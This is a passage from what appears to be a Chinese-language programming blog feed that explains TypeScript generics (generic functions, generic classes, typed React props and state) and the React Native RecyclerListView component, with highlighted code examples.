class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就可以正常使用泛型；</p><p>（注意：以上的方法本人都是在class类内部实现的，所以方法调用时都添加了this）</p><h2 id="泛型解释"><a href="#泛型解释" class="headerlink" title="泛型解释"></a>泛型解释</h2><p>以上student后面紧接的 <code>&lt;T&gt;</code> 表示声明一个表示类型的变量，<code>Value: T</code> 表示声明参数是 <code>T</code> 类型的，后面的 <code>: T</code> 表示返回值也是 <code>T</code> 类型的。</p><p>在调用时：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> name<span class="token punctuation">:</span> string <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//(method) Init.student&lt;string>(value: string): string</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>student(itemFun.getName(&#39;Jack&#39;))</code>由于参数推导出来的是string类型，所以这个时候<code>T</code> 代表了 <code>string</code>，因此此时 <code>student</code> 的返回类型也就是 <code>string</code>；</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> age<span class="token punctuation">:</span> number <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//(method) Init.student&lt;number>(value: number): number</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>student(itemFun.getAge(18))</code>由于参数推导出来的是number类型，所以这个时候<code>T</code> 代表了 number<code>，因此此时</code>student<code>的返回类型也就是 number</code>；</p><p>在方法调用时也可以指定<code>T</code>代替的类型：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> name<span class="token punctuation">:</span> string <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> age<span class="token punctuation">:</span> number <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token operator">&lt;</span>number<span class="token operator">></span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果不指定<code>T</code>类型，TypeScript会推导出当前的<code>T</code>指代的类型；</p><p>注意：如果指定的类型和推导出的有冲突就会报错：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> age<span class="token punctuation">:</span> number <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//报错如下</span><span class="token keyword">const</span> itemFun<span class="token punctuation">:</span> <span class="token punctuation">{</span>    getName<span class="token punctuation">:</span> <span class="token punctuation">(</span>name<span class="token punctuation">:</span> string<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">;</span>    getAge<span class="token punctuation">:</span> <span class="token punctuation">(</span>age<span class="token punctuation">:</span> number<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> number<span class="token punctuation">;</span><span class="token punctuation">}</span>Argument <span class="token keyword">of</span> type <span class="token string">'number'</span> is not assignable to parameter <span class="token keyword">of</span> type <span class="token string">'string'</span><span class="token punctuation">.</span><span class="token function">ts</span><span class="token punctuation">(</span><span class="token number">2345</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h1><p> 泛型类使用（<code>&lt;&gt;</code>）括起泛型类型，跟在类名后面。</p><h2 id="普通泛型类"><a href="#普通泛型类" class="headerlink" title="普通泛型类"></a>普通泛型类</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 声明泛型类，类型变量为 T</span><span class="token keyword">class</span> <span class="token class-name">FilteredList</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 声明过滤器是以 T 为参数类型，返回 boolean 的函数表达式</span>    filter<span class="token punctuation">:</span> <span class="token punctuation">(</span>v<span class="token punctuation">:</span> T<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> boolean<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 声明数据是 T 数组类型</span>    data<span class="token punctuation">:</span> T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>filter<span class="token punctuation">:</span> <span class="token punctuation">(</span>v<span class="token punctuation">:</span> T<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> boolean<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>filter <span class="token operator">=</span> filter<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">:</span> T<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">get</span> <span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> T<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 处理 string 类型的 FilteredList</span><span class="token keyword">const</span> validStrings <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilteredList</span><span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">(</span>s <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">!</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 处理 number 类型的 FilteredList</span><span class="token keyword">const</span> positiveNumber  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilteredList</span><span class="token operator">&lt;</span>number<span class="token operator">></span><span class="token punctuation">(</span>n <span class="token operator">=</span><span class="token operator">></span> n <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="react中的泛型类"><a href="#react中的泛型类" class="headerlink" title="react中的泛型类"></a>react中的泛型类</h2><h3 id="普通的react类"><a href="#普通的react类" class="headerlink" title="普通的react类"></a>普通的react类</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> PropTypes <span class="token keyword">from</span> <span class="token string">'prop-types'</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>            aState<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>            bState<span class="token punctuation">:</span> <span class="token string">''</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>App<span class="token punctuation">.</span>propTypes <span class="token operator">=</span> <span class="token punctuation">{</span>  aProps<span class="token punctuation">:</span> PropTypes<span class="token punctuation">.</span>string<span class="token punctuation">.</span>isRequired<span class="token punctuation">,</span>  bProps<span class="token punctuation">:</span> PropTypes<span class="token punctuation">.</span>string<span class="token punctuation">.</span>isRequired<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h3><p>本文的 interface 定义默认以 I 开头</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">IProps</span> <span class="token punctuation">{</span>  color<span class="token operator">?</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>  size<span class="token operator">?</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">IState</span> <span class="token punctuation">{</span>  aState<span class="token punctuation">:</span> string<span class="token punctuation">;</span>  bState<span class="token punctuation">:</span> number<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span><span class="token operator">&lt;</span>IProps<span class="token punctuation">,</span> IState<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">:</span>IProps<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>            aState<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>            bState<span class="token punctuation">:</span> <span class="token number">0</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>TypeScript 可以对 JSX 进行解析，充分利用其本身的静态检查功能，使用泛型进行 <code>Props</code>、 <code>State</code> 的类型定义。定义后在使用 <code>this.state</code> 和 <code>this.props</code> 时可以在编辑器中获得更好的智能提示，并且会对类型进行检查。</p><p>在这里可以看到 <code>Component</code> 这个泛型类， <code>P</code> 代表 <code>Props</code> 的类型， <code>S</code> 代表 <code>State</code> 的类型。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Component</span><span class="token operator">&lt;</span>P<span class="token punctuation">,</span> S<span class="token operator">></span> <span class="token punctuation">{</span>    readonly props<span class="token punctuation">:</span> Readonly<span class="token operator">&lt;</span><span class="token punctuation">{</span> children<span class="token operator">?</span><span class="token punctuation">:</span> ReactNode <span class="token punctuation">}</span><span class="token operator">></span> <span class="token operator">&amp;</span> Readonly<span class="token operator">&lt;</span>P<span class="token operator">></span><span class="token punctuation">;</span>    state<span class="token punctuation">:</span> Readonly<span class="token operator">&lt;</span>S<span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Component 泛型类在接收到 <code>P</code> ， <code>S</code> 这两个泛型变量后，将只读属性 <code>props</code> 的类型声明为交叉类型 <code>Readonly&lt;{ children?: ReactNode }&gt; &amp; Readonly&lt;P&gt;;</code> 使其支持 <code>children</code> 以及我们声明的 <code>color</code> 、 <code>size</code> 。</p><p>通过泛型的类型别名 <code>Readonly</code> 将 <code>props</code> 的所有属性都设置为只读属性。</p><p>Readonly 实现源码 <code>node_modules/typescript/lib/lib.es5.d.ts</code>  。</p><p>由于 <code>props</code> 属性被设置为只读，所以通过 <code>this.props.size = &#39;sm&#39;</code> 进行更新时候 TS 检查器会进行错误提示，<code>Error:(23, 16) TS2540: Cannot assign to &#39;size&#39; because it is a constant or a read-only property</code></p>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RecyclerListView的使用</title>
      <link href="2019/04/04/rcylist/"/>
      <url>2019/04/04/rcylist/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p>npm install –save recyclerlistview  </p><p>或者：  </p><p>npm install –save recyclerlistview@beta</p></blockquote><h2 id="概述和功能"><a href="#概述和功能" class="headerlink" title="概述和功能"></a>概述和功能</h2><p>RecyclerListView 是一个高性能的列表（listview）组件，同时支持 React Native 和 Web ，并且可用于复杂的列表。RecyclerListView 组件的实现灵感，来自于 Android <code>RecyclerView</code>原生组件及iOS <code>UICollectionView</code>原生组件。</p><p>RecyclerListView使用“cell recycling”来重用不再可见的视图来呈现项目，而不是创建新的视图对象。 对象的创建非常昂贵并且带有内存开销，这意味着当您滚动列表时内存占用量不断增加。 从内存中释放不可见的项目是另一种技术，但这会导致创建更多的对象和大量的垃圾收集。 回收是渲染无限列表的最佳方式，不会影响性能或内存效率。</p><h2 id="为什么需要RecyclerListView"><a href="#为什么需要RecyclerListView" class="headerlink" title="为什么需要RecyclerListView"></a>为什么需要RecyclerListView</h2><p>我们知道，React Native 的其他列表组件如<code>ListView</code>,会一次性创建所有的列表单元格——<code>cell</code>。如果列表数据比较多，则会创建很多的视图对象，而视图对象是非常消耗内存的。所以，<code>ListView</code>组件，对于我们业务中的这种无限列表，基本上是不可以用的。</p><p>对于React Native 官方提供的高性能的列表组件<code>FlatList</code>, 在Android设备上的表现，并不是十分友好。它的实现原理，是将列表中不在可视区域内的视图，进行回收，然后根据页面的滚动，不断的渲染出现在可视区域内的视图。这里需要注意的是，<code>FlatList</code>是将不可见的视图回收，从内存中清除了，下次需要的时候，再重新创建。<strong>这就要求设备在滚动的时候，能快速的创建出需要的视图，才能让列表流畅的展现在用户面前</strong>。而问题也就出现在这里，Android设备因为老化等原因，计算力等跟不上，加之React Native 本身 JS 层与 Native 层之间交互的一些问题（这里不做深入追究），导致创建视图的速度达不到使列表流畅滚动的要求。</p><p>那怎样来解决这样的问题呢？</p><p>RecyclerListView 受到 Android <code>RecyclerView</code> 和 iOS <code>UICollectionView</code> 的启发，进行两方面的优化：</p><ul><li>仅创建可见区域的视图，这步与<code>FlatList</code>是一致的。</li><li><code>cell recycling</code>，重用单元格，这个做法是<code>FlatList</code>缺乏的。</li></ul><p>对于程序来说，视图对象的创建是非常昂贵的，并且伴随着内存的消耗。意味着如果不断的创建视图，在列表滚动的过程中，内存占用量会不断增加。<code>FlatList</code>中将不可见的视图从内存中移除，这是一个比较好的优化手段，但同时也会导致大量的视图重新创建以及垃圾回收。</p><p>RecyclerListView 通过对不可见视图对象进行缓存及重复利用，一方面不会创建大量的视图对象，另一方面也不需要频繁的创建视图对象和垃圾回收。</p><p>基于这样的理论，所以RecyclerListView的性能是会优于FlatList的</p><h2 id="RecyclerListView的使用"><a href="#RecyclerListView的使用" class="headerlink" title="RecyclerListView的使用"></a>RecyclerListView的使用</h2><p>属性：</p><h3 id="1、dataProvider"><a href="#1、dataProvider" class="headerlink" title="1、dataProvider"></a>1、dataProvider</h3><p>首先需要定义一个数据驱动方法</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> dataProvider <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataProvider</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r1<span class="token punctuation">,</span> r2<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> r1 <span class="token operator">!==</span> r2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>定义完成之后去初始化数据</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>    dataProvider<span class="token punctuation">:</span> dataProvider<span class="token punctuation">.</span><span class="token function">cloneWithRows</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_generateArray</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">_generateArray</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cloneWithRows</p><blockquote><p>想要更新列表的dataProvider数据也就是（DataSource）必须每次通过cloneWithRows这个来重新挂载datasource的值。  </p><p>clone方法会自动提取新数据并进行逐行对比（使用rowHasChanged方法中的策略），这样列表就知道哪些行需要重新渲染了</p></blockquote><h3 id="2、LayoutProvider"><a href="#2、LayoutProvider" class="headerlink" title="2、LayoutProvider"></a>2、LayoutProvider</h3><p>定义列表布局</p><p>在这之前我们可以根据我们的业务场景，规划处几类的布局，然后自定义每种布局的类型来区分</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//表示列表中会出现三种ui类型的item</span><span class="token keyword">const</span> ViewTypes <span class="token operator">=</span> <span class="token punctuation">{</span>    FULL<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    HALF_LEFT<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    HALF_RIGHT<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面就可以来区分布局了  </p><p>为了进行<code>cell-recycling</code>,RecyclerListView要求对每个<code>cell</code>(通常也叫Item)定义一个<code>type</code>，根据<code>type</code>设置<code>cell</code>的<code>dim.width</code>和<code>dim.height</code>：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//第一个函数是定义item的ui类型，第二个是定义item的高宽</span><span class="token keyword">this</span><span class="token punctuation">.</span>_layoutProvider <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LayoutProvider</span><span class="token punctuation">(</span>    index <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> ViewTypes<span class="token punctuation">.</span>FULL<span class="token punctuation">;</span>        <span class="token punctuation">}</span>         <span class="token operator">...</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span>type<span class="token punctuation">,</span> dim<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> ViewTypes<span class="token punctuation">.</span>HALF_LEFT<span class="token punctuation">:</span>                dim<span class="token punctuation">.</span>width <span class="token operator">=</span> width <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>                dim<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">160</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token operator">...</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、rowRenderer"><a href="#3、rowRenderer" class="headerlink" title="3、rowRenderer"></a>3、rowRenderer</h3><p><code>rowRenderer</code>负责渲染一个<code>cell</code>,同样是根据<code>type</code>来进行渲染：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">_rowRenderer</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> ViewTypes<span class="token punctuation">.</span>HALF_LEFT<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>                <span class="token operator">&lt;</span>CellContainer style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>containerGridLeft<span class="token punctuation">}</span><span class="token operator">></span>                    <span class="token operator">&lt;</span>Text<span class="token operator">></span>Data<span class="token punctuation">:</span> <span class="token punctuation">{</span>data<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                <span class="token operator">&lt;</span><span class="token operator">/</span>CellContainer<span class="token operator">></span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">...</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么下面我们就来看看具体的一个简单的小栗子：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">/*** * To test out just copy this component and render in you root component */</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">RecycleTestComponent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token punctuation">{</span> width <span class="token punctuation">}</span> <span class="token operator">=</span> Dimensions<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"window"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Create the data provider and provide method which takes in two rows of data and return if those two are different or not.</span>        <span class="token keyword">let</span> dataProvider <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataProvider</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r1<span class="token punctuation">,</span> r2<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> r1 <span class="token operator">!==</span> r2<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Create the layout provider</span>        <span class="token comment" spellcheck="true">//First method: Given an index return the type of item e.g ListItemType1, ListItemType2 in case you have variety of items in your list/grid</span>        <span class="token comment" spellcheck="true">//Second: Given a type and object set the height and width for that type on given object</span>        <span class="token comment" spellcheck="true">//If you need data based check you can access your data provider here</span>        <span class="token comment" spellcheck="true">//You'll need data in most cases, we don't provide it by default to enable things like data virtualization in the future</span>        <span class="token comment" spellcheck="true">//NOTE: For complex lists LayoutProvider will also be complex it would then make sense to move it to a different file</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>_layoutProvider <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LayoutProvider</span><span class="token punctuation">(</span>            index <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> ViewTypes<span class="token punctuation">.</span>FULL<span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> ViewTypes<span class="token punctuation">.</span>HALF_LEFT<span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> ViewTypes<span class="token punctuation">.</span>HALF_RIGHT<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">(</span>type<span class="token punctuation">,</span> dim<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">case</span> ViewTypes<span class="token punctuation">.</span>HALF_LEFT<span class="token punctuation">:</span>                        dim<span class="token punctuation">.</span>width <span class="token operator">=</span> width <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">0.0001</span><span class="token punctuation">;</span>                        dim<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">160</span><span class="token punctuation">;</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token keyword">case</span> ViewTypes<span class="token punctuation">.</span>HALF_RIGHT<span class="token punctuation">:</span>                        dim<span class="token punctuation">.</span>width <span class="token operator">=</span> width <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>                        dim<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">160</span><span class="token punctuation">;</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token keyword">case</span> ViewTypes<span class="token punctuation">.</span>FULL<span class="token punctuation">:</span>                        dim<span class="token punctuation">.</span>width <span class="token operator">=</span> width<span class="token punctuation">;</span>                        dim<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">140</span><span class="token punctuation">;</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token keyword">default</span><span class="token punctuation">:</span>                        dim<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                        dim<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>_rowRenderer <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_rowRenderer<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Since component should always render once data has changed, make data provider part of the state</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>            dataProvider<span class="token punctuation">:</span> dataProvider<span class="token punctuation">.</span><span class="token function">cloneWithRows</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_generateArray</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">_generateArray</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token 